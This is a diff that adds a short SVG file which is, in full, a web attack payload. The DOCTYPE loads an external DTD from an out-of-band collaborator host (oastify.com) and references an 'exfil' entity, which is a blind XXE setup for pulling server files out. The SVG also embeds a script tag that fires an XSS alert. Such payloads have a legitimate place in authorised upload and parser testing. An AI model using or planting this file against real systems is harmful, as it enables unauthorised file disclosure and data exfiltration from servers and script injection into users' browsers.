@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY % xxe SYSTEM "https://5pvu8ykzt2so4hj0v5qlpfr7qywpkq8f.oastify.com/xxe.dtd">
+  %xxe;
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert('XSS');</script>
+  <text>&exfil;</text>
+</svg>
